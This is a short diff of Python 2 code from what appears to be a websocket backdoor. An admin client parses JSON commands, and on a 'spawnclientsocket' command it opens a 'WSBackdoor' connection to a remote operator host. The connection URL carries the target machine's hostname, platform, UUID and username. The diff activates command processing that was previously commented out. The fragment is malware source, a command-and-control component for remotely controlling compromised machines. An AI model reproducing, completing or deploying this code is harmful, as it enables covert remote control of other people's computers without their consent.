@@ -71,33 +71,28 @@ class AdminWebsocket(WebSocketClient):
     def closed(self, code, reason):
         print "Closed down", code, reason
 
-    def received_message(self, message):
-        print 'Received Message: %s' % message
-        '''
-        print 'RECEIVED ON ADMIN INTERFACE:\n\n %s' % str(jsonObject)
+    def received_message(self, jsonObject):
+        print 'RECEIVED JSON ON ADMIN INTERFACE:\n\n %s' % jsonObject
         processor = jsonObjectProccessor()
         processor.processObject(jsonObject)
-        '''
+
 
 class jsonObjectProccessor():
     '''Process Json Command Objects'''
     def __spawnHandler__(self, jsonDict):
         print 'Made it to Spawnhandler! - Reminder CLEAN THIS SHIT UP!'
-        group = str(platform.system())
-        print 'Detected Platform: %s' % group
-        print 'json user: %s' % jsonDict['user']
-        ws = WSBackdoor('http://' + ip + ':' + port + '/endpoint/' + group + '/' + UUID + '/' + jsonDict['user'], protocols=['http-only', 'chat'])
+        print 'json user: %s' % jsonDict['username']
+        ws = WSBackdoor('http://' + options.ip + ':' + options.port + '/endpoint/command/%s/%s/%s/%s' % (jsonDict['hostname'], jsonDict['platform'], jsonDict['uuid'], jsonDict['username']), protocols=['http-only', 'chat'])
         ws.connect()
         listeners.append(ws)
 
     def processObject(self, jsonObject):
         jsonObject = str(jsonObject)
-        decoded = json.loads(jsonObject)
-        print 'JSON OBJECT TYPE: ', type(decoded[0])
-        jsonDict = decoded[0]
+        jsonDict = json.loads(jsonObject)
+        print 'JSON OBJECT TYPE: ', type(jsonDict)
         print 'Command Dictionary: ', jsonDict
         print 'Command: %s' % jsonDict['command']
-        if jsonDict['command'] == 'spawnwebsocket':
+        if jsonDict['command'] == 'spawnclientsocket':
             self.__spawnHandler__(jsonDict)
 
 if __name__ == '__main__':
